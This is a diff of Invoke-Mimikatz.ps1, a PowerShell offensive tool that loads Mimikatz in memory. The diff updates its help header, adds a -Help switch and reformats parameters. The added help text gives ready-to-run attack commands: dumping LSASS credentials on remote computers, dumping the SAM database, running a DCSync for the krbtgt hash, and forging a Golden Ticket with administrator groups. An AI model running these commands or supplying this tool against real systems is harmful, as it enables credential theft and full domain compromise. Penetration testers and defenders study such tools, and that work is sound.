@@ -1,116 +1,88 @@
 function Invoke-Mimikatz
 {
-<#
-.SYNOPSIS
+#
+#.SYNOPSIS
+# PowerShell function to execute Mimikatz v2.2.0 (x64) #19041 (02MAR2023)
+#
+# Authors:
+#    o Invoke-Mimikatz.ps1 | Joe Bialek (@JosephBialek) and (@g4uss7)
+#    o Mimikatz.exe        | Benjamin DELPY (@gentilkiwi)
+#    o Absolutely Nothing  | Tyler McCann (@tylerdotrar)
+#
+#.DESCRIPTION
+# Reflectively loads Mimikatz v2.2.0 in memory using PowerShell. Can be used to dump credentials without writing anything
+# to disk, and can perform any functionality provided within Mimikatz.
+#
+# Parameters:
+#
+#   -DumpCreds     -->  Use mimikatz to dump credentials out of LSASS.
+#   -DumpCerts     -->  Use mimikatz to export all private certificates.
+#   -Command       -->  Supply mimikatz a custom command line.
+#   -ComputerName  -->  (Optional) An array of computernames to run the script on.
+#   -Help          -->  Return Get-Help information. 
+#
+# Examples:
+#
+#   # Execute mimikatz on two remote computers to dump credentials.
+#   PS> Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
+#
+#   # Dump the SAM database to a specified file.
+#   PS> Invoke-Mimikatz -Command '"lsadump::sam /sam:<hive_path>"'
+#
+#   # Perform a DCsync to acquire the KRBTGT NTLM hash.
+#   PS> Invoke-Mimikatz -Command '"lsadump::dcsync /domain:mda.mil /user:krbtgt"'
+#
+#   # Create a Golden Ticket with Administrator privileges.
+#   PS> Invoke-Mimikatz -Command '"kerberos::golden /user:RGBwiki /domain:<domain.com> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500 /groups:500,501,512,513,518,519,520 /ptt"'
+#
+#.LINK
+# https://github.com/g4uss47/Invoke-Mimikatz
+# https://github.com/gentilkiwi/mimikatz
+# https://github.com/tylerdotrar/PoorMansArmory
 
-This script leverages Mimikatz 2.1.1 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
-dump credentials without ever writing the mimikatz binary to disk. 
-The script has a ComputerName parameter which allows it to be executed against multiple computers.
-
-This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
-
-Function: Invoke-Mimikatz
-Author: Joe Bialek, Twitter: @JosephBialek
-Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
-License:  http://creativecommons.org/licenses/by/3.0/fr/
-Required Dependencies: Mimikatz (included)
-Optional Dependencies: None
-Mimikatz version: 2.1.1 20181209 ()
-
-.DESCRIPTION
-
-Reflectively loads Mimikatz 2.1.1 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any
-functionality provided with Mimikatz.
-
-.PARAMETER DumpCreds
-
-Switch: Use mimikatz to dump credentials out of LSASS.
-
-.PARAMETER DumpCerts
-
-Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).
-
-.PARAMETER Command
-
-Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.
-
-.PARAMETER ComputerName
-
-Optional, an array of computernames to run the script on.
-    
-.EXAMPLE
-
-Execute mimikatz on the local computer to dump certificates.
-Invoke-Mimikatz -DumpCerts
-
-.EXAMPLE
-
-Execute mimikatz on two remote computers to dump credentials.
-Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
-
-.EXAMPLE
-
-Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
-Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
-
-.NOTES
-This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
-Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
-Find mimikatz at: http://blog.gentilkiwi.com
-
-.LINK
-
-http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
-#>
 
 [CmdletBinding(DefaultParameterSetName="DumpCreds")]
 Param(
     [Parameter(Position = 0)]
-    [String[]]
-    $ComputerName,
+    [String[]] $ComputerName,
 
     [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
-    [Switch]
-    $DumpCreds,
+    [Switch]   $DumpCreds,
 
     [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
-    [Switch]
-    $DumpCerts,
+    [Switch]   $DumpCerts,
 
     [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
-    [String]
-    $Command
+    [String]   $Command,
+
+    [Parameter(Position = 1)]
+    [Switch]   $Help
 )
 
-Set-StrictMode -Version 2
 
+if ($Help) { return (Get-Help Invoke-Mimikatz) }
+Set-StrictMode -Version 2
 
 $RemoteScriptBlock = {
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $true)]
-        [String]
-        $PEBytes64,
+        [String] $PEBytes64,
 
         [Parameter(Position = 1, Mandatory = $true)]
-        [String]
-        $PEBytes32,
+        [String] $PEBytes32,
         
         [Parameter(Position = 2, Mandatory = $false)]
-        [String]
-        $FuncReturnType,
+        [String] $FuncReturnType,
                 
         [Parameter(Position = 3, Mandatory = $false)]
-        [Int32]
-        $ProcId,
+        [Int32]  $ProcId,
         
         [Parameter(Position = 4, Mandatory = $false)]
-        [String]
-        $ProcName,
+        [String] $ProcName,
 
         [Parameter(Position = 5, Mandatory = $false)]
-        [String]
-        $ExeArgs
+        [String] $ExeArgs
     )
     
     ###################################
@@ -1017,7 +989,6 @@ $RemoteScriptBlock = {
     }
 
     
-
     Function Get-ImageNtHeaders
     {
         Param(
